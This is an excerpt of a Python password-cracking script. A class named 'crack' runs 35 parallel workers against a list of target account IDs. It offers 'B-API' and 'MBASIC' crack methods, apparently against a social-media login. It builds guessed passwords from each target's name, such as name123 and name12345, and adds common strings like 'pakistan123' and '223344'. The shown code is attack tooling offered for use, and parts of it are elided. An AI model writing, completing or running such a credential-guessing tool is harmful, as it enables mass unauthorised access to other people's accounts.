...
class crack:
	...
	def kirim(self):
		self.jalan(f"\n[=] TOTAL IDZ: {str(len(id))}")
		pil=input("[?] USE MANNUAL PASSWORDS [Y/N]: ")
		if(pil in ("y","Y")):
			with Bool(max_workers=35) as kirim:
				print("[!] USE PASS LIKE THIS (223344,name,name123)")
				pwList=input("[+] Masukan Password List: ").split(",")
				print("\n CHOSE METHOD CRACK\n[1]. CRACK METHOD B-API (FAST)\n[2]. CRACK METHOD MBASIC (NORMAL) [ RECOMENDED FOR OK ]\n")
				tip=input("[?] Select: ")
			...
			with Bool(max_workers=35) as kirim:
				...
				for email in id:
					...
					if(len(str(name.lower()))>=6):
						pw=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345','pakistan123','223344','000786']
